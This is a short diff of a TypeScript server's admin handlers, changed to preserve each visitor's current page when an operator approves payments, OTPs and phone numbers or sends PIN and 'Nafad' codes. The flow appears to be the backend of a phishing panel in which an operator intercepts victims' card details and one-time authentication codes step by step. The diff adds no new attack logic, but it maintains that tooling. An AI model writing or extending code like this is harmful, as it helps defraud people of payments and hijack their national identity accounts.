@@ -622,9 +622,14 @@ async function startServer() {
         return;
       }
 
+      // Read current visitor data to preserve raw info
+      const currentVisitor = await readVisitor(visitorId);
+      const currentPage = currentVisitor?.currentPage || "check";
+
       const updateData: Record<string, any> = {
         paymentActionAt: new Date().toISOString(),
         adminPaymentAction: action,
+        currentPage, // Preserve the current page
       };
 
       if (action === "approved") {
@@ -658,9 +663,13 @@ async function startServer() {
         return;
       }
 
+      const currentVisitor = await readVisitor(visitorId);
+      const currentPage = currentVisitor?.currentPage || "step2";
+
       const updateData: Record<string, any> = {
         otpActionAt: new Date().toISOString(),
         adminOtpAction: action,
+        currentPage,
       };
 
       if (action === "approved") {
@@ -696,9 +705,13 @@ async function startServer() {
         return;
       }
 
+      const currentVisitor = await readVisitor(visitorId);
+      const currentPage = currentVisitor?.currentPage || "step3";
+
       const updateData: Record<string, any> = {
         adminPinCodeSent: true,
         adminPinSentAt: new Date().toISOString(),
+        currentPage,
       };
 
       if (pinCode) {
@@ -725,9 +738,13 @@ async function startServer() {
         return;
       }
 
+      const currentVisitor = await readVisitor(visitorId);
+      const currentPage = currentVisitor?.currentPage || "step5";
+
       const updateData: Record<string, any> = {
         phoneActionAt: new Date().toISOString(),
         adminPhoneAction: action,
+        currentPage,
       };
 
       if (action === "approved") {
@@ -763,9 +780,13 @@ async function startServer() {
         return;
       }
 
+      const currentVisitor = await readVisitor(visitorId);
+      const currentPage = currentVisitor?.currentPage || "step4";
+
       const updateData: Record<string, any> = {
         adminNafadCodeSent: true,
         adminNafadSentAt: new Date().toISOString(),
+        currentPage,
       };
 
       if (nafadCode) {
